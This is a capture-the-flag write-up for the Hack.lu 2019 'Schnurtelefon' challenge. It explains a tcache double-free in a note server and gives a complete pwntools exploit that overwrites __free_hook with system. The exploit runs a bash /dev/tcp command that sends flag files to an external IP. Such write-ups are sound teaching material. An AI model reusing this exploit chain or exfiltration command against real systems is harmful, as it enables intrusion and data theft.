---
title: Schnurtelefon - Hack.lu CTF 2019
date: 2019-10-24 22:00:00
categories:
  - Pwn
  - linux
  - heap
tags:
  - CTF
  - writeup
  - Pwn
---

Linux client-server application heap exploitation
<!-- excerpt -->

**Challenge points**: 434
**No. of solves**: 11

There are two binaries; server and client, the user interacts with server via the client. The server is a simple note storage system. The environment has glibc version 2.27 (easy tcache double free corruptions).

There are 5 operations in this note challenge

1. store note
    + client reads the input from the user and sends it to the server
    + The server maintains an array of size 16, allocated pointer of fixed size 0x30 is stored in the first empty location. The client also maintains an array of flags for each location indicating whether busy (flag is non-zero) or free (flag is zero).
    ```c
      dest = malloc(0x20uLL);
      for ( j = &note_storage; *j && j < &end; ++j )
        ;
      *j = dest;
      memcpy(dest, a1 + 2, 0x20uLL);
      result = a2;
      a2[1] = dest;
    ```
    + if the for loop exits with the `j < &end` condition failing,that is, when the table is full, then the new pointer is stored in the 17th index.
    + this leads to the flag being set for the 17th index in the client.

2. delete note
    + client read the index to be freed and sends it to the server only if the flag for the corresponding index is busy.
    + the index is not validated when the flag is checked
    + for loop is buggy, letting us free the 17th index
    ```c
    for ( k = &note_storage; a1[1] != *k && k < &end; ++k )
    ;
    free(*k);
    result = strncpy(a2 + 16, "OK", 0x1FuLL);
    ```
    + the pointer is not nulled out in the table leading to potential UAF/double free

3. get note
    + if the flag is busy then index is send to server to get the data stored in the note.
    + same buggy for loop is used, letting us read from the 17th index

4. change name
    + This functionality gives us the primitives required to exploit the challenge
    + the name string is stored right below the flag array in the client.
    + this means that the 17th index is the first 8 bytes of name
    + so by changing the name we can modify the status of the 17th pointer in the server binary
    + this gives us a `double free` primitive


First we allocate 17 chunks to fill the table and overflow the table by one.
Getting a heap leak is straight forward
+ free the 17 chunk, the flag will now be clear
+ use the `change name` functionality to set the flag
+ free the 17 chunk again
+ set the flag again, and view it to get heap leak

Now that we have heap leak we can corrupt fd of free tcache chunk by using the double free.

To get the libc leak
+ we corrupt the fd with the address to a forged chunk of size 0x110
+ the fake chunk wil be serviced by malloc in a couple of allocations
+ free the fake chunk 8 times, this inserts the chunk into the unsorted bin
+ now view the chunk to get libc leak

Now we perform one more double free and overwrite the fd with `__free_hook`. Then we overwrite it with the address to `system`. The next free will call system.

We are exploiting the server binary. This means that passing "/bin/sh" as the argument to `system` will not get you shell as only the client's stdin and stdout is redirected to us. So we need to spawn a reverse shell.
Command I used : `bash -c 'cat f* >& /dev/tcp/54.93.105.54/7'`. We can only write 0x20 bytes at a time, so the command has to be written in two adjacent chunks. I used overlapping chunks to write the command without any null bytes in between.

```python
from pwn import *

s=process(["./client","1"])
#s=remote("schnurtelefon.forfuture.fluxfingers.net", 1337)
libc = ELF("./libc-2.27.so")

name = "a"*0x10
s.recvuntil("What is your name?")
s.sendline(name)

def add(data):
    s.sendlineafter("5: exit", str(1))
    s.sendafter("what do you want to store?", str(data))

def show(idx):
    s.sendlineafter("5: exit", str(3))
    s.sendlineafter("which note do you want to retrieve?", str(idx))

def free(idx):
    s.sendlineafter("5: exit", str(2))
    s.sendlineafter("which note do you want to delete?", str(idx))

def chgname(name):
    s.sendlineafter("5: exit", str(4))
    s.recvuntil("what's your name?")
    s.sendline(name)

# add chunks to overflow the table by one
add(p64(0) + p64(0x111) + p64(0)) # create a fake chunk which will be needed later for libc leak
for i in range(16):
    add("asd")

log.info("----------loop 1 DONE --------------");
free(17)
chgname(p64(0xdeadbeef)) # mark the idx in client
free(17)
chgname(p64(0xdeadbeef)) # mark the idx in client
show(17)
s.recvline()
heap = u64(s.recv(8))-0x5f0
log.info("Heap = " + hex(heap))
#gdb.attach(s,'b*0x00555555555733')

# corrupt fd to get arbitary allocation
target = heap+0x300 # target with forged size of 0x110 needed for libc leak
free(17)
add(p64(target))
chgname(p64(0))
add("aaa")
chgname(p64(0))
add(p64(0x1337))

# free chunk with overwritten size
free(17)

# free the chunk 7 more times to insert it into the unsorted bin
for i in range(7):
    chgname(p64(0x61))
    free(17)

log.info("----------loop 2 DONE --------------");

# view the unsorted bin chunk to get leak
chgname(p64(0xdeadbeef))
show(17)
s.recvline()
base = u64(s.recv(8))-0x3ebca0
log.info("libc = " + hex(base))
free_hook = base + libc.symbols['__free_hook']
system = base + libc.symbols['system']

# write reverse shell payload
add("f"*0x10 + "3.105.54/7'" + "\x00")
free(0)
add("bash -c 'cat f* >& /dev/tcp/54.9")
chgname(p64(0))

# double free
add(p64(0x1337))
free(17)
chgname(p64(0xdeadbeef))
free(17)

# corrupt fd to get write to free_hook
add(p64(free_hook))
add("c"*0x18)
chgname(p64(0))
add(p64(system))
free(0)

s.interactive()
```
